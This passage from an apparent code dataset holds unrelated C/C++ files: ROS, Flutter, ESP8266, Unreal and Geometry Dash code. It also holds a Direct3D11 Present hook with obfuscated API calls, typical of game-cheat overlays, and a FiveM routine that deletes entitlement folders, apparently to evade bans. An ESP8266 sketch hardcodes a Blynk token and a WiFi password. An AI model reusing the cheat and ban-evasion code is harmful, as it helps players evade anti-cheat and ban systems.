\"install/hni_cpp/include/moves/hello.txt\";\n  moves_map_[\"bye\"] = \"install/hni_cpp/include/moves/hello.txt\";\n  moves_map_[\"byebye\"] = \"install/hni_cpp/include/moves/hello.txt\";\n  moves_map_[\"goodbye\"] = \"install/hni_cpp/include/moves/hello.txt\";\n  moves_map_[\"good-bye\"] = \"install/hni_cpp/include/moves/hello.txt\";\n  moves_map_[\"big\"] = \"install/hni_cpp/include/moves/big.txt\";\n  moves_map_[\"little\"] = \"install/hni_cpp/include/moves/little.txt\";\n  moves_map_[\"down\"] = \"install/hni_cpp/include/moves/down.txt\";\n  moves_map_[\"up\"] = \"install/hni_cpp/include/moves/up.txt\";\n  moves_map_[\"right\"] = \"install/hni_cpp/include/moves/right.txt\";\n  moves_map_[\"left\"] = \"install/hni_cpp/include/moves/left.txt\";\n  moves_map_[\"fear\"] = \"install/hni_cpp/include/moves/fear.txt\";\n  moves_map_[\"scared\"] = \"install/hni_cpp/include/moves/fear.txt\";\n\n  RCLCPP_INFO(this->get_logger(), \"ChatActionServer Initialized\");\n}\n\nChatActionServer::~ChatActionServer() {}\n\nrclcpp_action::GoalResponse ChatActionServer::handleGoal(\n  const rclcpp_action::GoalUUID & uuid,\n  std::shared_ptr<const hni_interfaces::action::ChatPlay::Goal> goal)\n{\n  RCLCPP_INFO(this->get_logger(), \"Received chat goal request\");\n  (void)uuid;\n\n  while (!gstt_srv_client_->wait_for_service(1s)) {\n    if (!rclcpp::ok()) {\n      RCLCPP_ERROR(this->get_logger(), \"Interrupted while waiting for gstt_service. Exiting.\");\n      return rclcpp_action::GoalResponse::REJECT;\n    }\n    RCLCPP_INFO(this->get_logger(), \"gstt_service not available, waiting again...\");\n  }\n\n  while (!gtts_srv_client_->wait_for_service(1s)) {\n    if (!rclcpp::ok()) {\n      RCLCPP_ERROR(this->get_logger(), \"Interrupted while waiting for gtts_service. Exiting.\");\n      return rclcpp_action::GoalResponse::REJECT;\n    }\n    RCLCPP_INFO(this->get_logger(), \"gtts_service not available, waiting again...\");\n  }\n\n  while (!chat_srv",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#define BLYNK_TEMPLATE_ID \"TMPL3NE2dQPyj\"\n#define BLYNK_TEMPLATE_NAME \"smart parking final\"\n#define BLYNK_AUTH_TOKEN \"koiWW9VTsfg0_TO6RBCvK1jVjPUshhIH\"\n#define BLYNK_PRINT Serial\n\n\n#include <ESP8266WiFi.h>\n#include <BlynkSimpleEsp8266.h>\n#include <SoftwareSerial.h>\n\n\nchar auth[] = \" koiWW9VTsfg0_TO6RBCvK1jVjPUshhIH\";\n\n// Your WiFi credentials.\n// Set password to \"\" for open networks.\nchar ssid[] = \"Aman\";\nchar pass[] = \"amanvish\";\n\nBlynkTimer timer;\n\nString myString; // complete message from arduino, which consistors of snesors data\nchar rdata; // received charactors\n\nint firstVal, secondVal,thirdVal; // sensors\nint led1,led2;\n// This function sends Arduino's up time every second to Virtual Pin (1).\n// In the app, Widget's reading frequency should be set to PUSH. This means\n// that you define how often to send data to Blynk App.\nvoid myTimerEvent()\n{\n  // You can send any value at any time.\n  // Please don't send more that 10 values per second.\n  Blynk.virtualWrite(V1, millis() / 1000);\n \n}\n\n\n\nvoid setup()\n{\n  // Debug console\n  Serial.begin(9600);\n\n  Blynk.begin(auth, ssid, pass);\n\n    timer.setInterval(1000L,sensorvalue1);\n    timer.setInterval(1000L,sensorvalue2);\n \n\n}\n\nvoid loop()\n{\n   if (Serial.available() == 0 )\n   {\n  Blynk.run();\n  timer.run(); // Initiates BlynkTimer\n   }\n  \n  if (Serial.available() > 0 )\n  {\n    rdata = Serial.read();\n    myString = myString+ rdata;\n   // Serial.print(rdata);\n    if( rdata == '\\n')\n    {\n     Serial.println(myString);\n  // Serial.println(\"fahad\");\n// new code\nString l = getValue(myString, ',', 0);\nString m = getValue(myString, ',', 1);\n\n\n// these leds represents the leds used in blynk application\nled1 = l.toInt();\nled2 = m.toInt();\n\n  myString = \"\";\n// end new code\n    }\n  }\n\n}\n\nvoid sensorvalue1()\n{\nint sdata = led1;\n  // You can send any value at any time.\n  // Please don't send more that 10 values per second.\n  Blynk.virtualWrite(V10, sdata);\n\n}\nvoid sensorvalue2()\n{\nint sdata = led2;\n  // You can send any value at any time.\n  // Please don't send more that 10 values per second.\n  Blynk.virtualWrite(V11, sdata);\n\n}\n\n\n\n\n\n\nString getValue(String data, char separator, int index)\n{\n    int found = 0;\n    int strIndex[] = { 0, -1 };\n    int maxIndex = data.length() - 1;\n\n    for (int i = 0; i <= maxIndex && found <= index; i++) {\n        if (data.charAt(i) == separator || i == maxIndex) {\n            found++;\n            strIndex[0] = strIndex[1] + 1;\n            strIndex[1] = (i == maxIndex) ? i+1 : i;\n        }\n    }\n       return found > index ? data.substring(strIndex[0], strIndex[1]) : \"\";\n}",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "\ufeff#include \"Teacher.h\"\n#include <fstream>\n#include <sstream>\n#include<iostream>\n#include<string>\n#include<vector>\n\nusing namespace std;\n\nTeacher::Teacher() {}\nTeacher::Teacher(const string& userid, const string& password, const string& username)\n    : User(userid, password, username) {}\n\nbool Teacher::login(const string& userid, const string& password, const string& username) {\n    ifstream file(\"teacheraccount.txt\");\n    string line;\n    while (getline(file, line)) {\n        istringstream iss(line);\n        string user, pass;\n        if (!(iss >> user >> pass)) { break; }\n\n        string name;\n        getline(iss, name);\n\n        if (user == userid && pass == password) {\n            this->username = name;\n            return true;\n        }\n    }\n    return false;\n}\n\nvoid Teacher::changePassword(const string& userid, const string& password, const string& username) {\n    string currentUsername, currentPassword;\n\n    cout << \"Nhap tai khoan hien tai:\";\n    getline(cin, currentUsername);\n\n    cout << \"Nhap mat khau hien tai:\";\n    getline(cin, currentPassword);\n\n    ifstream file(\"teacheraccount.txt\");\n    string line;\n\n    bool found = false;\n\n    while (getline(file, line)) {\n        istringstream iss(line);\n        string user, pass, name;\n        if (!(iss >> user >> pass >> name)) {\n            cout << \"Loi dong nay: \" << line << endl;\n            continue; \n        }\n\n        if (user == currentUsername && pass == currentPassword) {\n            found = true;\n            break;\n        }\n    }\n\n    file.close();\n\n    if (!found) {\n        cout << \"Tai khoan hoac mat khau hien tai khong chinh xac.\\n\";\n        return; \n    }\n\n    string newPassword;\n    cout << \"Nhap mat khau moi: \";\n    getline(cin, newPassword);\n\n    vector<string> newLines;\n\n    file.open(\"teacheraccount.txt\");\n    while (getline(file, line)) {\n        istringstream iss(line);\n        string user, pass, name;\n        if (!(iss >> user >> pass >> name)) {\n            cout << \"Lo dong nay: \" << line << endl;\n            continue; \n        }\n\n        if (user == currentUsername && pass == currentPassword) {\n            pass = newPassword;\n        }\n\n        newLines.push_back(user + \" \" + pass + \" \" + name);\n    }\n\n    file.close();\n\n    ofstream file_out(\"teacheraccount.txt\");\n\n    for (const string& newLine : newLines) {\n        file_out << newLine << \"\\n\";\n    }\n\n    file_out.close();\n\n    this->password = newPassword;\n    cout << \"Doi mat khau thanh cong.\\n\";\n}\n    \n\nvoid Teacher::forgotPassword() {\n    User::forgotPassword();\n}\n\nvoid Teacher::viewProfile() {\n    cout << \"\\nChao mung:\" << username << \"\\n\";\n}\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"WeaponBase.h\"\n\nAWeaponBase::AWeaponBase()\n{\n\tPrimaryActorTick.bCanEverTick = true;\n\n\tRoot = CreateDefaultSubobject<USceneComponent>(TEXT(\"Root\"));\n\tSetRootComponent(Root);\n\n\tMesh = CreateDefaultSubobject<UStaticMeshComponent>(TEXT(\"Mesh\"));\n\tMesh->SetupAttachment(Root);\n\n\tMuzzlePoint = CreateDefaultSubobject<USceneComponent>(TEXT(\"MuzzlePoint\"));\n\tMuzzlePoint->SetupAttachment(Root);\n\n}\n\nvoid AWeaponBase::BeginPlay()\n{\n\tSuper::BeginPlay();\n\t\n}\n\nvoid AWeaponBase::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\n\t// Is needed in order to get controller (Rufus)\n\tOwnerCharacter = Cast<APawn>(GetOwner());\n\tif(!OwnerCharacter) return;\n\n\t// Is needed in order to get PlayerViewPort (Rufus)\n\tOwnerController = OwnerCharacter->GetController();\n\tif(!OwnerController) return;\n\n\t// Is needed in order to establish max range and direction for directs shots, i.e. non-projectile (Rufus)\n\tOwnerController->GetPlayerViewPoint(Location, Rotation);\n\n}\n\nvoid AWeaponBase::DelaySwitch()\n{\n\tbDelayed = true;\n}\n\nvoid AWeaponBase::SlimeCharge()\n{\n\tbSlimeCharged = true;\n\tUE_LOG(LogTemp, Error, TEXT(\"SLIME CHARGED\"));\n}\n\n\nbool AWeaponBase::GetbUnlimitedAmmo() const\n{\n\treturn bUnlimitedAmmo;\n}\n\nint32 AWeaponBase::GetTotalAmmo() const\n{\n\treturn TotalAmmo;\n}\n\nint32 AWeaponBase::GetCurrentClip() const\n{\n\treturn CurrentClip;\n}\n\nint32 AWeaponBase::GetClipSize() const\n{\n\treturn ClipSize;\n}\n\nAController* AWeaponBase::GetOwnerController() const\n{\n\treturn OwnerController;\n}\n\nAPawn* AWeaponBase::GetOwnerCharacter() const\n{\n\treturn OwnerCharacter;\n}\n\nFVector AWeaponBase::GetLocation() const\n{\n\treturn Location;\n}\n\nFRotator AWeaponBase::GetRotation() const\n{\n\treturn Rotation;\n}\n\nUSceneComponent* AWeaponBase::GetMuzzlePoint() const\n{\n\treturn MuzzlePoint;\n}\n\n\nvoid AWeaponBase::SetbUnlimitedAmmo(bool _bUnlimitedAmmo) {\n\tbUnlimitedAmmo = _bUnlimitedAmmo;\n}\n\nvoid AWeaponBase::SetTotalAmmo(int32 _TotalAmmo) {\n\tTotalAmmo = _TotalAmmo;\n}\n\nvoid AWeaponBase::SetCurrentClip(int32 _CurrentClip) {\n\tCurrentClip = _CurrentClip;\n}\n\nvoid AWeaponBase::SetClipSize(int32 _ClipSize) {\n\tClipSize = _ClipSize;\n}\n\nvoid AWeaponBase::SetFireRate(int32 _FireRate)\n{\n\tFireRate = _FireRate;\n}\n\n\nvoid AWeaponBase::InitiateReload()\n{\n\tif(bUnlimitedAmmo)\n\t{\n\t\tCurrentClip = ClipSize;\n\t}\n\telse\n\t{\n\t\tif(TotalAmmo-ClipSize > 0)\n\t\t{\n\t\t\tTotalAmmo -= (ClipSize - CurrentClip);\n\t\t\tCurrentClip = ClipSize;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tCurrentClip = TotalAmmo;\n\t\t\tTotalAmmo = 0;\n\t\t}\n\t}\n\n\tbReloading = false;\n\tbDelayed = true;\n}\n\n\nFString AWeaponBase::GetAmmo() const\n{\n\treturn FString::Printf(TEXT(\"%d / \u221e\"), CurrentClip);\n}\n\n\n\n",
    "#include \"trace.hpp\"\r\n\r\nvoid trace::setup()\r\n{\r\n\t// Locate Appdata\r\n\tstd::string appdata = getenv(\"LOCALAPPDATA\");\r\n\tstd::string localappdata = getenv(\"APPDATA\");\r\n\r\n\t// Locate DigitalElements\r\n\tappdata = appdata + \"\\\\\" + \"DigitalEntitlements\";\r\n\tif(std::filesystem::remove_all(appdata))\r\n\t{\r\n\t\tstd::cout << \"Removed: \" << appdata << std::endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tstd::cout << \"Couldn't Find: \" << appdata << std::endl;\r\n\t}\r\n\r\n\t// Locate CitizenFX\r\n\tappdata = localappdata + \"\\\\\" + \"CitizenFX\";\r\n\tif (std::filesystem::remove_all(appdata))\r\n\t{\r\n\t\tstd::cout << \"Removed: \" << appdata << std::endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tstd::cout << \"Couldn't Find: \" << appdata << std::endl;\r\n\t}\r\n}\r\n\r\nINT CALLBACK browse_callback_proc(HWND hwnd, UINT uMsg, LPARAM lp, LPARAM pData)\r\n{\r\n\tif (uMsg == BFFM_INITIALIZED) SendMessage(hwnd, BFFM_SETSELECTION, TRUE, pData);\r\n\treturn 0;\r\n}\r\n\r\nvoid trace::destroy()\r\n{\r\n\tm_fivem_path.clear();\r\n\tstd::remove(m_save_path.c_str());\r\n}\r\n\r\nstd::string trace::set_folder(std::string title)\r\n{\r\n\tstd::ifstream path(m_save_path);\r\n\tif (!path.good())\r\n\t{\r\n\t\tstd::string appdata = getenv(\"LOCALAPPDATA\");\r\n\t\tauto fivem_path = appdata + \"\\\\\" + \"FiveM\";\r\n\r\n\t\tBROWSEINFO br;\r\n\t\tZeroMemory(&br, sizeof(BROWSEINFO));\r\n\t\tbr.lpfn = browse_callback_proc;\r\n\t\tbr.ulFlags = BIF_RETURNONLYFSDIRS | BIF_NEWDIALOGSTYLE;\r\n\t\tbr.hwndOwner = NULL;\r\n\t\tbr.lpszTitle = title.c_str();\r\n\t\tbr.lParam = (LPARAM)fivem_path.c_str();\r\n\r\n\t\tstd::string ret;\r\n\r\n\t\tLPITEMIDLIST pidl = NULL;\r\n\t\tif ((pidl = SHBrowseForFolder(&br)) != NULL)\r\n\t\t{\r\n\t\t\tchar buffer[_MAX_PATH];\r\n\t\t\tif (SHGetPathFromIDList(pidl, buffer)) ret = buffer;\r\n\t\t}\r\n\r\n\t\tif (!std::filesystem::exists(ret + \"\\\\\" + \"FiveM.exe\"))\r\n\t\t{\r\n\t\t\treturn std::string();\r\n\t\t}\r\n\r\n\t\tif (!ret.empty())\r\n\t\t{\r\n\t\t\tstd::ofstream save_path(m_save_path);\r\n\t\t\tsave_path << ret << std::endl;\r\n\t\t\tsave_path.close();\r\n\t\t}\r\n\r\n\t\treturn ret;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tstd::string name;\r\n\t\tpath >> name;\r\n\t\treturn name;\r\n\t}\r\n}\r\n\r\n\r\nvoid trace::set_launch_build()\r\n{\r\n\tint choice;\r\n\r\n\tstd::vector<const char*> m_builds = { \"2545\", \"2372\", \"2189\", \"2060\", \"1604\" };\r\n\r\n\tfor (int i = 0; i < m_builds.size(); i++)\r\n\t{\r\n\t\tstd::cout << \"  [\" << i + 1 << \"]  :  \" << m_builds[i] << std::endl;\r\n\t}\r\n\tstd::cin >> choice;\r\n\r\n\tauto path = std::string(m_fivem_path + m_citizen_ini_path).c_str();\r\n\r\n\tif (std::filesystem::exists(path))\r\n\t{\r\n\t\tWritePrivateProfileString(\"Game\", \"SavedBuildNumber\", m_builds[choice - 1], path);\r\n\t}\r\n}\r\n\r\nstd::string trace::get_launch_build()\r\n{\r\n\tauto path = std::string(m_fivem_path + m_citizen_ini_path).c_str();\r\n\tauto buildNumber = 0;\r\n\r\n\tif (std::filesystem::exists(path))\r\n\t{\r\n\t\tbuildNumber = GetPrivateProfileInt(\"Game\", \"SavedBuildNumber\", buildNumber, path);\r\n\t}\r\n\treturn std::to_string(buildNumber);\r\n}\r\n\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"tidiane\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// TODO: Refactor this code to be more readable and maintainable\n\n#include <Geode/Geode.hpp>\n\nusing namespace geode::prelude;\n\n#define TAG_CONFIRM_UNFRIEND 0x21\n#define TAG_CONFIRM_UNBLOCK 0x22\n\n#include <Geode/modify/FriendsProfilePage.hpp>\n#include <Geode/modify/GJUserCell.hpp>\n\nstruct UserData {\n    int32_t m_accountID;\n    CCMenuItemToggler *m_checkbox;\n\n    std::string m_username;\n};\n\nstatic UserListType g_userListType;\nstatic std::vector<UserData> g_userData;\nstatic CCMenuItemToggler *g_selectAll;\nstatic std::function<void(UserListType)> g_batchRemoveAlertHandlerCallback = nullptr;\n\nvoid updateSelectAllCheckbox() {\n    if (!g_selectAll) return;\n\n    bool allSelected = true;\n    for (auto &userData: g_userData) {\n        bool isCheckboxOn = userData.m_checkbox->isOn();\n        if (!isCheckboxOn) {\n            allSelected = false;\n            break;\n        }\n    }\n\n    g_selectAll->toggle(allSelected);\n}\n\nclass BatchRemoveAlertHandler : public FLAlertLayerProtocol {\n    void FLAlert_Clicked(FLAlertLayer *modal, bool btn2) override {\n        if (btn2) {\n            auto tag = modal->getTag();\n            if (tag == TAG_CONFIRM_UNFRIEND) {\n                // show alert\n                if (g_batchRemoveAlertHandlerCallback)\n                    g_batchRemoveAlertHandlerCallback(UserListType::Friends);\n\n                g_batchRemoveAlertHandlerCallback = nullptr;\n            } else if (tag == TAG_CONFIRM_UNBLOCK) {\n                // show alert\n                if (g_batchRemoveAlertHandlerCallback)\n                    g_batchRemoveAlertHandlerCallback(UserListType::Blocked);\n\n                g_batchRemoveAlertHandlerCallback = nullptr;\n            }\n        }\n    }\n};\n\nstatic BatchRemoveAlertHandler g_batchRemoveAlertHandler;\n\nclass $modify(FriendsListExt, FriendsProfilePage) {\n    bool init(UserListType type) {\n        if (!FriendsProfilePage::init(type)) return false;\n\n        g_userListType = type;\n\n        auto myButton = CCMenuItemSpriteExtra::create(\n                CCSprite::createWithSpriteFrameName(\n                        type == UserListType::Friends ? \"accountBtn_removeFriend_001.png\" : \"GJ_trashBtn_001.png\"),\n                this, menu_selector(FriendsListExt::onBatchRemove)\n        );\n        myButton->setPosition({0, -269.f});\n        myButton->setID(\"batchremover-delete-btn\");\n\n        g_selectAll = CCMenuItemToggler::createWithStandardSprites(this, menu_selector(FriendsListExt::onSelectAll),\n                                                                   0.7f);\n        g_selectAll->setPosition({40, -258.f});\n        g_selectAll->setID(\"batchremover-select-all\");\n\n        auto *mainLayer = getChildOfType<CCLayer>(this, 0);\n        auto *menu = getChildOfType<CCMenu>(mainLayer, 0);\n        menu->addChild(myButton);\n        menu->addChild(g_selectAll);\n\n        // Add \"All\" label\n        auto allLabel = CCLabelBMFont::create(\"All\", \"goldFont.fnt\");\n        allLabel->setScale(0.55f);\n        allLabel->setPosition({69.f, -257.f});\n        allLabel->setID(\"batchremover-all-label\");\n        menu->addChild(allLabel);\n\n        return true;\n    }\n\n    void getUserListFinished(cocos2d::CCArray *arr, UserListType type) {\n        g_userData.clear();\n        FriendsProfilePage::getUserListFinished(arr, type);\n    }\n\n    void onBatchRemove(CCObject *) {\n        // log selected users\n        std::vector<UserData> selectedUsers;\n        for (auto &userData: g_userData) {\n            if (userData.m_checkbox->isOn()) {\n                selectedUsers.push_back(userData);\n            }\n        }\n\n        if (selectedUsers.empty()) {\n            FLAlertLayer::create(\n                    this, \"Nothing here...\",\n                    fmt::format(\"You <cr>have not selected</c> any users to <cy>{}</c>.\",\n                                g_userListType == UserListType::Friends ? \"unfriend\" : \"unblock\").c_str(),\n                    \"OK\", nullptr\n            )->show();\n            return;\n        }\n\n        FLAlertLayer *modal;\n        if (g_userListType == UserListType::Friends) {\n            modal = FLAlertLayer::create(\n                    &g_batchRemoveAlertHandler, \"Unfriend\",\n                    fmt::format(\n                            \"Are you sure you want to <cy>unfriend</c> {} user{}?\",\n                            selectedUsers.size(), selectedUsers.size() > 1 ? \"s\" : \"\"),\n                    \"Back\", \"Unfriend\"\n            );\n            modal->setTag(TAG_CONFIRM_UNFRIEND);\n            modal->m_button2->updateBGImage(\"GJ_button_06.png\");\n        } else {\n            modal = FLAlertLayer::create(\n                    &g_batchRemoveAlertHandler, \"Unblock\",\n                    fmt::format(\"Are you sure you want to <cy>unblock</c> {} 